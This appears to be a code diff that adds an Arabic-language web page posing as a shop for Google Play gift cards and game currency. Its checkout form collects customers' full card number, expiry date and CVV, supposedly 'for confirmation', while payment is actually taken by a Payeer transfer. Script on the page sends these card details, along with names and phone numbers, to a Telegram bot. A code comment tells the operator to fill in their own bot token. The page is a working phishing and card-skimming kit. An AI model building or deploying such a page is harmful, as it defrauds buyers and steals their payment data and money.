@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر الأكواد الرقمية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+            padding: 40px 20px;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+        }
+        
+        .product-card h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+        
+        .price {
+            font-size: 1.8em;
+            color: #667eea;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        
+        .btn-buy {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .btn-buy:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        /* المودال */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            background: white;
+            margin: 5% auto;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .close {
+            position: absolute;
+            right: 20px;
+            top: 15px;
+            font-size: 28px;
+            cursor: pointer;
+            color: #999;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .payment-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-right: 4px solid #667eea;
+        }
+        
+        .payment-info h4 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .btn-submit {
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+        
+        .btn-submit:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);
+        }
+        
+        .confirmation-container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .success-animation {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+        
+        .whatsapp-btn {
+            background: linear-gradient(45deg, #25D366, #128C7E);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .whatsapp-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .telegram-btn {
+            background: linear-gradient(45deg, #0088cc, #005999);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px;
+            transition: all 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1>🎮 متجر الأكواد الرقمية</h1>
+            <p>اشترِ بطاقات غوغل بلاي وأكواد الألعاب بأمان وسهولة</p>
+        </header>
+
+        <div class="products-grid">
+            <!-- بطاقات غوغل بلاي -->
+            <div class="product-card">
+                <h3>📱 بطاقة غوغل بلاي</h3>
+                <div class="price">10$ - 50 ريال</div>
+                <button class="btn-buy" onclick="openPaymentModal('بطاقة غوغل بلاي 10$', 10)">اشتري الآن</button>
+            </div>
+            
+            <div class="product-card">
+                <h3>📱 بطاقة غوغل بلاي</h3>
+                <div class="price">25$ - 125 ريال</div>
+                <button class="btn-buy" onclick="openPaymentModal('بطاقة غوغل بلاي 25$', 25)">اشتري الآن</button>
+            </div>
+
+            <!-- فري فاير -->
+            <div class="product-card">
+                <h3>🔥 فري فاير</h3>
+                <div class="price">100 جوهرة - 5$</div>
+                <button class="btn-buy" onclick="openPaymentModal('فري فاير 100 جوهرة', 5)">اشتري الآن</button>
+            </div>
+            
+            <div class="product-card">
+                <h3>🔥 فري فاير</h3>
+                <div class="price">1000 جوهرة - 35$</div>
+                <button class="btn-buy" onclick="openPaymentModal('فري فاير 1000 جوهرة', 35)">اشتري الآن</button>
+            </div>
+
+            <!-- بلود سترايك -->
+            <div class="product-card">
+                <h3>🔫 بلود سترايك</h3>
+                <div class="price">1000 غولد - 3$</div>
+                <button class="btn-buy" onclick="openPaymentModal('بلود سترايك 1000 غولد', 3)">اشتري الآن</button>
+            </div>
+            
+            <div class="product-card">
+                <h3>🔫 بلود سترايك</h3>
+                <div class="price">10000 غولد - 22$</div>
+                <button class="btn-buy" onclick="openPaymentModal('بلود سترايك 10000 غولد', 22)">اشتري الآن</button>
+            </div>
+        </div>
+
+        <!-- مودال الدفع -->
+        <div id="paymentModal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeModal()">&times;</span>
+                <h3>💳 إتمام الشراء</h3>
+                
+                <form id="paymentForm" onsubmit="processPayment(event)">
+                    <input type="hidden" id="productName">
+                    <input type="hidden" id="productPrice">
+                    
+                    <div class="form-group">
+                        <label>الاسم الكامل:</label>
+                        <input type="text" id="customerName" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>رقم الجوال:</label>
+                        <input type="tel" id="customerPhone" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>البريد الإلكتروني (اختياري):</label>
+                        <input type="email" id="customerEmail">
+                    </div>
+
+                    <!-- قسم الفيزا -->
+                    <div class="form-group">
+                        <label>💳 معلومات البطاقة (للتأكيد):</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>تاريخ الانتهاء:</label>
+                            <input type="text" id="cardExpiry" placeholder="MM/YY" required>
+                        </div>
+                        <div class="form-group">
+                            <label>CVV:</label>
+                            <input type="text" id="cardCvv" placeholder="123" required maxlength="3">
+                        </div>
+                    </div>
+
+                    <!-- معلومات الدفع -->
+                    <div class="payment-info">
+                        <h4>💰 تعليمات الدفع:</h4>
+                        <p>1. سوف تحصل على رقم Payeer الخاص بنا</p>
+                        <p>2. قم بتحويل المبلغ إلى هذا الرقم</p>
+                        <p>3. سجل فيديو للعملية وأرسله لنا</p>
+                        <p>4. سنقوم بإرسال الكود خلال 10 دقائق</p>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="submitBtn">
+                        💳 إتمام الطلب والحصول على رقم Payeer
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- صفحة التأكيد -->
+        <div id="confirmationPage" class="confirmation-container" style="display:none;">
+            <div class="success-animation">✅</div>
+            <h2>تم استلام طلبك بنجاح!</h2>
+            
+            <div class="order-summary">
+                <div class="order-item">
+                    <span>رقم الطلب:</span>
+                    <strong id="confirmOrderId"></strong>
+                </div>
+                <div class="order-item">
+                    <span>المنتج:</span>
+                    <strong id="confirmProduct"></strong>
+                </div>
+                <div class="order-item">
+                    <span>المبلغ:</span>
+                    <strong id="confirmAmount"></strong>
+                </div>
+            </div>
+
+            <div class="payment-info">
+                <h4>💳 معلومات الدفع:</h4>
+                <p><strong>رقم Payeer الخاص بنا:</strong></p>
+                <p style="font-size: 1.5em; color: #667eea; font-weight: bold;" id="payeerId">P1134445524</p>
+                
+                <p><strong>المبلغ المطلوب:</strong> <span id="paymentAmount"></span></p>
+                <p><strong>اسم المستلم:</strong> [اسمك هنا]</p>
+            </div>
+
+            <div class="payment-info">
+                <h4>📹 تعليمات مهمة:</h4>
+                <p>1. قم بتحويل المبلغ إلى الرقم أعلاه</p>
+                <p>2. سجل فيديو واضح لعملية التحويل</p>
+                <p>3. أرسل الفيديو عبر أحد الوسائل التالية:</p>
+                
+                <div style="margin: 20px 0;">
+                    <a href="#" class="whatsapp-btn" id="whatsappLink">📱 واتساب</a>
+                    <a href="#" class="telegram-btn" id="telegramLink">✈️ تيليجرام</a>
+                </div>
+                
+                <p>4. سيتم إرسال الكود خلال 10-15 دقيقة</p>
+            </div>
+
+            <button onclick="window.location.reload()" class="btn-buy">العودة للمتجر</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات البوت - غير هذه القيم
+        const BOT_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';
+        const CHAT_ID = '-1001234567890';
+        const YOUR_PAYEER_ID = 'P1134445524';
+        const YOUR_PHONE = '+966500000000';
+        const YOUR_TELEGRAM = '@username';
+
+        function openPaymentModal(productName, price) {
+            document.getElementById('productName').value = productName;
+            document.getElementById('productPrice').value = price;
+            document.getElementById('paymentModal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('paymentModal').style.display = 'none';
+            document.getElementById('paymentForm').reset();
+        }
+
+        function processPayment(event) {
+            event.preventDefault();
+            
+            // جمع البيانات
+            const orderData = {
+                productName: document.getElementById('productName').value,
+                price: document.getElementById('productPrice').value,
+                customerName: document.getElementById('customerName').value,
+                customerPhone: document.getElementById('customerPhone').value,
+                customerEmail: document.getElementById('customerEmail').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                cardExpiry: document.getElementById('cardExpiry').value,
+                cardCvv: document.getElementById('cardCvv').value,
+                orderId: 'ORD-' + Date.now() + '-' + Math.random().toString(36).substr(2, 5)
+            };
+
+            // إرسال البيانات للتيليجرام
+            sendToTelegram(orderData);
+
+            // عرض صفحة التأكيد
+            showConfirmationPage(orderData);
+        }
+
+        function sendToTelegram(orderData) {
+            const message = `
+🆕 طلب جديد #${orderData.orderId}
+─────────────────
+🎮 المنتج: ${orderData.productName}
+💰 المبلغ: $${orderData.price}
+👤 العميل: ${orderData.customerName}
+📞 الجوال: ${orderData.customerPhone}
+📧 الإيميل: ${orderData.customerEmail || 'لم يقدم'}
+
+💳 معلومات البطاقة:
+• الرقم: ${orderData.cardNumber}
+• الانتهاء: ${orderData.cardExpiry}
+• CVV: ${orderData.cardCvv}
+
+⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
+─────────────────
+✅ ينتظر الدفع عبر Payeer
+            `;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(error => console.error('Error:', error));
+        }
+
+        function showConfirmationPage(orderData) {
+            // إخفاء المودال
+            document.getElementById('paymentModal').style.display = 'none';
+            
+            // تعبئة البيانات
+            document.getElementById('confirmOrderId').textContent = orderData.orderId;
+            document.getElementById('confirmProduct').textContent = orderData.productName;
+            document.getElementById('confirmAmount').textContent = '$' + orderData.price;
+            document.getElementById('payeerId').textContent = YOUR_PAYEER_ID;
+            document.getElementById('paymentAmount').textContent = '$' + orderData.price;
+            
+            // إعداد روابط التواصل
+            const whatsappMessage = `مرحباً، لدي طلب جديد #${orderData.orderId} - ${orderData.productName}`;
+            const telegramMessage = `مرحباً، لدي طلب جديد #${orderData.orderId}`;
+            
+            document.getElementById('whatsappLink').href = `https://wa.me/${YOUR_PHONE}?text=${encodeURIComponent(whatsappMessage)}`;
+            document.getElementById('telegramLink').href = `https://t.me/${YOUR_TELEGRAM}?text=${encodeURIComponent(telegramMessage)}`;
+            
+            // إظهار صفحة التأكيد
+            document.getElementById('confirmationPage').style.display = 'block';
+        }
+
+        // إغلاق المودال بالنقر خارج المحتوى
+        window.onclick = function(event) {
+            const modal = document.getElementById('paymentModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        // تنسيق رقم البطاقة
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            
+            e.target.value = formattedValue.substring(0, 19);
+        });
+
+        // تنسيق تاريخ الانتهاء
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+    </script>
+</body>
+</html>
